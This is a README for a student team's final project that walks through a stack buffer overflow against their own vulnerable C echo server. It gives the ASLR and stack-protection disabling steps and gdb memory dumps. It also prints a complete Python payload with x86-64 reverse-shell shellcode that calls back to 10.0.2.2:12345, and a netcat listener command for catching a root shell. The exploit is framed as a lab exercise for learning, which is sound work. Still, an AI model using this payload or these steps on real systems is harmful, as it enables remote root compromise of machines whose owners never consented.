# Final Project: Buffer overflow exploit with shell injection

## Team Members: 
 - Sushant Bansal
 - Andreas Brandner
 - Chen-Ju Hou
 - Yuta Nakamura

## Description:
- Implement a server in C that reads data from a socket and writes it to memory with an unsafe memory operation
- Implement a client program that writes a malicious payload to spawn a reverse shell via TCP to the server's socket

## Crafting the vulnerable system:
- Create a vulnerable environment in a vm(We are using Ubuntu 18.04 64-bit) through disabling protections such as ASLR
	- Disable ASLR temporarily with: `echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space` 
	- Disable ASLR permanently by adding `kernel.randomize_va_space = 0` to /etc/sysctl.conf

## Exploitation:
- Server is being run by user root
- Open netcat on own machine to catch reverse shell from server (e.g. `nc localhost -lp 12345` if shellcode will connect to port 12345)
- Start client with payload, e.g. `python payload.py | ./client 0.0.0.0`
- Shell with root access is now accessible in netcat


## Usage Notes:
- Server
	- Compile with: `gcc server.c -o server -fno-stack-protector -z execstack`, so the server won't have stack-protection and the stack will be executable
	- Usage: ./server.exec	
	- Close all clients before exiting server! , otherwise reset terminal session before restarting server
	- Hit < Ctrl > + < C > to close the server
- Client
	- Compile with makefile
	- Usage: ./client.exec <IP_SERVER>
	- Send "exit" to server to quit client
	
## VM configuration:
- add port-forwarding for ssh-server and socket-server in VirtualBox


## Step by step instruction on creating the exploit

### What you need:
- A 64-bit unix based system (we are using ubuntu 18.04.2)
- Root access to the system
- a C compiler (we are using gcc version 5.4.0)
- gdb


1. Clone from the repo

```
$ git clone https://github.com/JiNova/team_hackerman.git
```

2. Creating vulnerability in the system through disabling ASLR
	- Disable ASLR temporarily with: `$echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space` 
	- Disable ASLR permanently by adding `kernel.randomize_va_space = 0` to /etc/sysctl.conf


3.  Compile the files. A makefile is provided:

```
Server_sys $ make
```

The makefile disables stack protectors in the server.c.

4. Write a .gdbinit file:
This file reduces the amount of environmental variables we have and set the disassebly style to intel as opposed to AT&T which is the default.
Setting the disassembly is not required to recreate but intel output format is more legible. 
```
Server_sys $ cd ~
Server_sys $ printf "unset env COLUMNS\nunset env LINES\nset disassembly-flavor intel" >> ~/.gdbinit  
```

5. Start up the server with gdb and run:
Make sure to use the absolute address because using relative addresses changes memory allocation as well because additional environment variable will be added.

```
Server_sys $ gdb /home/user/team_hackerman-master/server.exec
(gdb) break *echo_msg              // set a break point to our function echo_msg()
(gdb) r				   // run program; the server should now be listening for connection

```

6. Send the payload through the client program
```
Client_sys $ python2 ../payload.py | ./client [ip_address] 
// if connecting locally ip_address is 0.0.0.0
// Make sure to use python2 because the payload evaluates differently in python3
```

Now the breakpoint shoud be hit.

7. Analysis

move down to the fourth instruction:
```
(gdb) ni
0x000000000040096d in echo_msg ()
(gdb) ni
0x0000000000400970 in echo_msg ()
(gdb) ni
0x0000000000400977 in echo_msg ()
(gdb) ni
0x000000000040097e in echo_msg ()
```

disassemble the echo_msg():
```
(gdb) disass echo_msg 
```

You should see something like this. This is before the exploit:
```
Dump of assembler code for function echo_msg:
   0x000000000040096c <+0>:	push   rbp
   0x000000000040096d <+1>:	mov    rbp,rsp
   0x0000000000400970 <+4>:	sub    rsp,0x90
   0x0000000000400977 <+11>:	mov    QWORD PTR [rbp-0x88],rdi
=> 0x000000000040097e <+18>:	mov    rdx,QWORD PTR [rbp-0x88]
   0x0000000000400985 <+25>:	lea    rax,[rbp-0x80]
   0x0000000000400989 <+29>:	mov    rsi,rdx
   0x000000000040098c <+32>:	mov    rdi,rax
   0x000000000040098f <+35>:	call   0x400740 <strcpy@plt>
   0x0000000000400994 <+40>:	nop
   0x0000000000400995 <+41>:	leave  
   0x0000000000400996 <+42>:	ret    
End of assembler dump.
```

We can see our payload at 0x00007fffffffd4f0 about to be written in:

```
(gdb) x/144x $rsp
0x7fffffffd450:	0x00000000	0x00000000	0xffffd4f0	0x00007fff
0x7fffffffd460:	0x00603010	0x00000000	0xffffde30	0x00007fff
0x7fffffffd470:	0x00000000	0x00000000	0xf7a87409	0x00007fff
0x7fffffffd480:	0xffffd4f0	0x00007fff	0x7fffff71	0x00000000
0x7fffffffd490:	0x00000004	0x00000000	0x00400cf8	0x00000000
0x7fffffffd4a0:	0xffffd4f0	0x00007fff	0x00000000	0x00000000
0x7fffffffd4b0:	0x0000008e	0x00000000	0xf7dd2620	0x00007fff
0x7fffffffd4c0:	0x00400ce3	0x00000000	0xf7a7c7fa	0x00007fff
0x7fffffffd4d0:	0x00000000	0x00000000	0xf7ffe168	0x00007fff
0x7fffffffd4e0:	0xffffdd30	0x00007fff	0x00400b11	0x00000000
0x7fffffffd4f0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd500:	0x90909090	0x90909090	0x90909090	0xc0319090
0x7fffffffd510:	0x9dd1bb48	0x8cd09196	0xf748ff97	0x5f5453db
0x7fffffffd520:	0x54575299	0x0f3bb05e	0x90909005	0x90909090
0x7fffffffd530:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd540:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd550:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd560:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd570:	0x90909090	0x90909090	0xffffdb40	0x00007fff
0x7fffffffd580:	0xffffd5f8	0x00007fff	0x00000000	0x00000000
0x7fffffffd590:	0x00000000	0x00000001	0xf7ffed60	0x00007fff
0x7fffffffd5a0:	0x00000000	0x00000000	0x0000000a	0x00000000
0x7fffffffd5b0:	0xffffd620	0x00007fff	0xffffd5f0	0x00007fff
---Type <return> to continue, or q <return> to quit---
0x7fffffffd5c0:	0xf7ffe168	0x00007fff	0x00000000	0x00000000
0x7fffffffd5d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffd5e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffd5f0:	0xf7ffed60	0x00007fff	0xffffde30	0x00007fff
0x7fffffffd600:	0x00000340	0x00000000	0x464c457f	0x03010102
0x7fffffffd610:	0x00000000	0x00000000	0x003e0003	0x00000001
0x7fffffffd620:	0x00020950	0x00000000	0x00000040	0x00000000
0x7fffffffd630:	0x001c72b8	0x00000000	0x00000000	0x00380040
0x7fffffffd640:	0x0040000a	0x00470048	0x00000006	0x00000005
0x7fffffffd650:	0x00000040	0x00000000	0x00000040	0x00000000
0x7fffffffd660:	0x00000040	0x00000000	0x00000230	0x00000000
0x7fffffffd670:	0x00000230	0x00000000	0x00000008	0x00000000
0x7fffffffd680:	0x00000003	0x00000004	0x00196660	0x00000000

(gdb) x/s 0x00007fffffffd4f0         // you can run this to check our payload
0x7fffffffd4f0:	'\220' <repeats 30 times>, "\061\300H\273ѝ\226\221Ќ\227\377H\367\333ST_\231RWT^\260;\017\005", '\220' <repeats 79 times>, "@\333\377\377\377\177"

```

Set a new breakpoint and continue to where our payload has been injected.

```
(gdb) break *echo_msg+40
Breakpoint 2 at 0x400994
(gdb) c
Continuing.

Breakpoint 2, 0x0000000000400994 in echo_msg ()
```


We can see where our injection is being written to after `strcpy`. In our case it is at 0x7fffffffd460.

```
(gdb) disass echo_msg 
Dump of assembler code for function echo_msg:
   0x000000000040096c <+0>:	push   rbp
   0x000000000040096d <+1>:	mov    rbp,rsp
   0x0000000000400970 <+4>:	sub    rsp,0x90
   0x0000000000400977 <+11>:	mov    QWORD PTR [rbp-0x88],rdi
   0x000000000040097e <+18>:	mov    rdx,QWORD PTR [rbp-0x88]
   0x0000000000400985 <+25>:	lea    rax,[rbp-0x80]
   0x0000000000400989 <+29>:	mov    rsi,rdx
   0x000000000040098c <+32>:	mov    rdi,rax
   0x000000000040098f <+35>:	call   0x400740 <strcpy@plt>
=> 0x0000000000400994 <+40>:	nop
   0x0000000000400995x/144wx $rsp <+41>:	leave  
   0x0000000000400996 <+42>:	ret    
End of assembler dump.
(gdb) x/144wx $rsp
0x7fffffffd450:	0x00000000	0x00000000	0xffffd4f0	0x00007fff
0x7fffffffd460:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd470:	0x90909090	0x90909090	0x90909090	0xc0319090
0x7fffffffd480:	0x9dd1bb48	0x8cd09196	0xf748ff97	0x5f5453db
0x7fffffffd490:	0x54575299	0x0f3bb05e	0x90909005	0x90909090
0x7fffffffd4a0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd4b0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd4c0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd4d0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd4e0:	0x90909090	0x90909090	0xffffdb40	0x00007fff
0x7fffffffd4f0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd500:	0x90909090	0x90909090	0x90909090	0xc0319090
0x7fffffffd510:	0x9dd1bb48	0x8cd09196	0xf748ff97	0x5f5453db
0x7fffffffd520:	0x54575299	0x0f3bb05e	0x90909005	0x90909090
0x7fffffffd530:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd540:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd550:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd560:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd570:	0x90909090	0x90909090	0xffffdb40	0x00007fff
0x7fffffffd580:	0xffffd5f8	0x00007fff	0x00000000	0x00000000
0x7fffffffd590:	0x00000000	0x00000001	0xf7ffed60	0x00007fff
0x7fffffffd5a0:	0x00000000	0x00000000	0x0000000a	0x00000000
0x7fffffffd5b0:	0xffffd620	0x00007fff	0xffffd5f0	0x00007fff
0x7fffffffd5c0:	0xf7ffe168	0x00007fff	0x00000000	0x00000000
0x7fffffffd5d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffd5e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffd5f0:	0xf7ffed60	0x00007fff	0xffffde30	0x00007fff
0x7fffffffd600:	0x00000340	0x00000000	0x464c457f	0x03010102
0x7fffffffd610:	0x00000000	0x00000000	0x003e0003	0x00000001
0x7fffffffd620:	0x00020950	0x00000000	0x00000040	0x00000000
0x7fffffffd630:	0x001c72b8	0x00000000	0x00000000	0x00380040
0x7fffffffd640:	0x0040000a	0x00470048	0x00000006	0x00000005
0x7fffffffd650:	0x00000040	0x00000000	0x00000040	0x00000000
0x7fffffffd660:	0x00000040	0x00000000	0x00000230	0x00000000
0x7fffffffd670:	0x00000230	0x00000000	0x00000008	0x00000000
0x7fffffffd680:	0x00000003	0x00000004	0x00196660	0x00000000
```

If we continue, this will cause a segfault. This is because the return address in the payload doesn't go to the right location.
```
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
```

We want to modify our payload so it goes to the top of our nop slide, which we found to be at 0x7fffffffd460. 

We go into the payload and modify the return address to correspond to the right location. 0x7fffffffd460 are 6 bytes in total, but the return pointer in a 64-bit system is 8 bytes long, so what we really want to inject is 0x00007fffffffd464 (added 4 bytes just to be sure). So we accordingly change our python payload script:
```
$ cat payload.py
# ret_addr = b"\x00\x00\x7f\xff\xff\xff\xdb\x40"[::-1] // Code from before
ret_addr = b"\x00\x00\x7f\xff\xff\xff\xd4\x64"[::-1] // print it out in reverse because little endian

buf = b"\x90"*20
buf += 	b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e"
buf += 	b"\x0f\x05\x97\xb0\x2a\x48\xb9\xfe\xff\xcf"
buf += 	b"\xc6\xf5\xff\xfd\xfd\x48\xf7\xd9\x51\x54"
buf += 	b"\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21"
buf += 	b"\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52"
buf += 	b"\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
buf += 	b"\x51\x54\x5f\x0f\x05"
buf += b"\x90"*(136-len(buf)) + ret_addr

print(buf)
```
The injected shellcode in this example tries to connect and forward a shell over TCP to IP address 10.0.2.2 (standard Gateway IP on a Virtualbox VM) on port 12345. So, before you deliver the payload, you would want to use netcat to listen for the reverse shell.

8. Try it again! Exploit should work now


## Takeaway

1. Memory allocation change for many reasons and it is hard to find out the exact location which we need to get a shell injection, even with ASLR disabled. Below are some of the factors that will result in allocation change:
- Injection of environemntal variables when using programs like gdb
- Running from a relative path
- The user running it

2. We did certain things that simplified the exploit, without these simplifications it would be really hard to create our results:
- ASLR off 
	- This ensures that the memory allocation is not randomized each time, which allow us to recreate the exploit each time 
- No stack protector
	- This allows us to buffer overflow without the program terminating when it detecting us changing memory locations we were not supposed to

3. We didn't need nop slope in our program, since with gdb we can see fully where we are writing to. In an actual attack we will have to guess and use NOP slope to increase our chance of success. We still added NOP slopes in our program, but mostly to prevent from off by one errors.

